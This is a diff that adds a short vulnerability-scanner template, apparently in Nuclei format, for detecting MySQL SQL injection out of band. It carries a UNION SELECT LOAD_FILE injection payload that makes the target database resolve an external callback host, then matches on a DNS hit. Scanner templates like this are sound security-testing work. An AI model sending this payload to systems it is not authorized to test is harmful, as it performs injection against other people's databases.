@@ -1,0 +1,18 @@
+id: mysql-oob-loadfile
+
+info:
+  name: MySQL LOAD_FILE DNS OOB
+  author: openai
+  severity: high
+  tags: mysql,sqli,oob
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1' UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\abc')-- -"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
